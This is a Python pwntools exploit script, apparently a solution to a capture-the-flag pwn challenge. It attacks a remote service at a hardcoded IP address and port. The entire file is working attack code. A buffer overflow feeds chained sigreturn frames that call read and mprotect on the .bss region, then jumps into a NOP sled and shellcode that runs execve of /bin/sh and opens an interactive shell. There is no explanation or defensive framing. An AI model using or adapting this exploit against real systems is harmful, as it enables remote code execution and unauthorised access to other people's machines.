#!/usr/bin/python3

from pwn import *


context.arch = "amd64"

HOST , PORT = "54.78.163.105" ,32115

io = remote(HOST, PORT)

bss = 0x403100

# gadgets
pop_rax = p64(0x401001)
syscall_ret = p64(0x401a8b)

FRAME = SigreturnFrame()

FRAME.rax = 0x0
FRAME.rdi = 0x0
FRAME.rsi = bss
FRAME.rdx = 0x500
FRAME.rsp = bss
FRAME.rip = 0x401a8b


frame = SigreturnFrame()

frame.rax = 0xa
frame.rdi = bss - 0x100
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = bss + 0x110
frame.rip = 0x401a8b

input()

EXPLOIT = pop_rax
EXPLOIT += p64(15)
EXPLOIT += syscall_ret
EXPLOIT += bytes(FRAME)

io.sendline(b"V" * 256 + b"\x17" + EXPLOIT)

final_frame = SigreturnFrame()
final_frame.rip = bss + 0x250
final_frame.rsp = bss + 0x500

log.info("Stage two")


CODE = """
    mov rax, 0x3b
    xor rdi, rdi
    mov rdi, 0x0068732f6e69622f
    push rdi

    mov rdi, rsp
    xor rcx, rcx
    push rcx
    mov rsi, rsp
    mov rcx, rsp
    syscall

"""

SHELLCODE = asm(CODE)

EXPLOIT = pop_rax
EXPLOIT += p64(15)
EXPLOIT += syscall_ret
EXPLOIT += bytes(frame)
EXPLOIT += pop_rax
EXPLOIT += p64(15)
EXPLOIT += syscall_ret
EXPLOIT += bytes(final_frame)
EXPLOIT += b"\x90" * 0x100
EXPLOIT += SHELLCODE

io.sendline(EXPLOIT)


io.interactive()
